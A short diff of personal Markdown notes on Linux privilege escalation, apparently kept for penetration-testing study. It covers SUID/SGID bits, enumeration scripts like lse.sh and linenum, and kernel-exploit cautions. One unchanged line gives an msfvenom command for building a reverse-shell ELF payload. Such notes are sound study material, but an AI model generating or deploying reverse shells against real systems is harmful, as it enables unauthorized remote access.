@@ -1,4 +1,4 @@
-##### special permissions
+#### special permissions
 setuid SUID bit: when set, files get executed with the privileges of the file owner
 setgid SGID bit: when this is set on a file, the file will get executed with the privileges of the file group
 when set on a directory files created within that directory will inherit the group of the directory itself
@@ -26,7 +26,8 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= =f elf shell.elf
 ```
 
 # tools
-linux smart enumeration (lse.sh): bash script
+linux smart enumeration (lse.sh)
+linenum
 
 # kernel
 usually a last resort as they can be unstable or crash machine 
@@ -73,7 +74,6 @@ on local:
 # suid/sgid executables
 
 # passwords and keys
-
 
 # NFS
 
